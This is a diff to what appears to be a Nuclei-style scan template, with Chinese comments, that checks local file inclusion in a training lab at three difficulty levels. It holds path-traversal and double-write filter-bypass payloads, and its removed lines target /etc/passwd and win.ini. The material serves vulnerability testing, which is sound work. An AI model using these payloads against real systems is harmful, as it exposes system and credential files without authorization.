@@ -28,11 +28,24 @@ info:
     - https://owasp.org/www-community/attacks/Path_Traversal
 
 requests:
-  # ── ① Windows 目标：读 win.ini ────────────────────────────────
+  # ── ① low 档：路径穿越读 Web 根之外的文件 ─────────────────────────
+  #
+  # 从被包含脚本所在目录 `html/lfi/pages/` 往上退两级就是 `html/`，
+  # 靶场自带的 `lfi_probe.txt` 就在那儿 —— 它在 `pages/` 之外，
+  # 正常情况下 `include` 够不着。
+  #
+  # ⚠️ 判据为什么用靶场自带的演示文件，而不是 /etc/passwd 或 win.ini：
+  #    系统文件在不同机器上不一定存在、内容也不一样；
+  #    而 `../../../../Windows/win.ini` 这种写法还依赖**目录层级** ——
+  #    仓库换个路径检出，层数就对不上了。
+  #
+  #    本文件早先的版本正是栽在这里：注释写着「退 4 级到系统盘根」，
+  #    实测要退 **8 级**才到盘根，于是整条 PoC 永远 0 命中
+  #    （而场景本身是好的 —— CI 断言用的是便携载荷，所以一直是绿的）。
+  #    换成固定内容的演示文件后，判据只取决于漏洞是否成立。
   - method: GET
     path:
-      # 从 html/lfi/pages/ 出发往上退 4 级到系统盘根
-      - "{{BaseURL}}/lfi/low.php?page=..%2F..%2F..%2F..%2FWindows%2Fwin.ini"
+      - "{{BaseURL}}/lfi/low.php?page=..%2F..%2Flfi_probe.txt"
 
     matchers-condition: and
     matchers:
@@ -42,8 +55,7 @@ requests:
       - type: word
         part: body
         words:
-          - "for 16-bit app support"
-          - "[fonts]"
+          - "VULNLAB_LFI_PROBE_MARKER"
 
       # 排除「包含失败」的情况
       - type: word
@@ -59,31 +71,21 @@ requests:
         part: body
         name: file_content
         regex:
-          - "(\\[fonts\\][\\s\\S]{0,80})"
+          - "(VULNLAB_LFI_PROBE_MARKER[\\s\\S]{0,60})"
 
-  # ── ② Linux 目标：读 /etc/passwd ──────────────────────────────
+  # ── ② medium 档：双写绕过黑名单 ──────────────────────────────────
   #
-  # 用绝对路径 —— 这说明拼接的前缀被完全绕过了。
+  # medium 档把 `../` 替换成空串（只替换一次）。
+  # 于是 `....//` 里的 `../` 被删掉之后，剩下的部分**又拼回了** `../` ——
+  # 「删除动作本身把片段拼了回来」，和 SQL 注入的双写绕过是同一个结构。
+  #
+  # 注意两档的载荷不能混用：
+  #   · low 认 `../../`，但 `....//` 在 low 档解析不出正确路径
+  #   · medium 会把 `../../` 过滤掉，必须用双写形态
+  # 这一点是实测确认的（两边都试过），不是推出来的。
   - method: GET
     path:
-      - "{{BaseURL}}/lfi/low.php?page=%2Fetc%2Fpasswd"
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status: [200]
-
-      - type: regex
-        part: body
-        regex:
-          - "root:.*:0:0:"
-
-  # ── ③ 双写绕过黑名单（medium 档）─────────────────────────────
-  #
-  # 单独一条：验证「黑名单 + 单次替换」这个组合的绕过。
-  - method: GET
-    path:
-      - "{{BaseURL}}/lfi/medium.php?page=....%2F%2F....%2F%2F..%2F..%2F..%2FWindows%2Fwin.ini"
+      - "{{BaseURL}}/lfi/medium.php?page=....%2F%2F....%2F%2Flfi_probe.txt"
 
     matchers-condition: and
     matchers:
@@ -93,9 +95,41 @@ requests:
       - type: word
         part: body
         words:
-          - "for 16-bit app support"
+          - "VULNLAB_LFI_PROBE_MARKER"
+
+      # 负向判据只认「包含失败」——
+      # 「过滤器命中」不能当被拦的证据：绕过成功时它同样会出现
+      # （双写载荷里确实有一个 `../` 被删掉了，只是剩下的还能用）。
+      - type: word
+        part: body
+        words: ["包含失败"]
+        condition: or
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        name: leaked_file
+        regex:
+          - "(VULNLAB_LFI_PROBE_MARKER)"
+
+  # ── ③ high 档：负向对照（预期不命中）─────────────────────────────
+  #
+  # 同一条双写载荷打 high 档 —— 它走「白名单映射 + 越界兜底」，
+  # 解析后的路径不在白名单里就直接拒绝，够不到 `pages/` 之外。
+  #
+  # 这一条**不应该命中**。它的作用是把「读到文件」归因给路径穿越本身，
+  # 而不是「靶场页面碰巧会输出那个文件的内容」。
+  - method: GET
+    path:
+      - "{{BaseURL}}/lfi/high.php?page=....%2F%2F....%2F%2Flfi_probe.txt"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
 
       - type: word
         part: body
-        words: ["过滤器命中"]
-        negative: true
+        words:
+          - "VULNLAB_LFI_PROBE_MARKER"
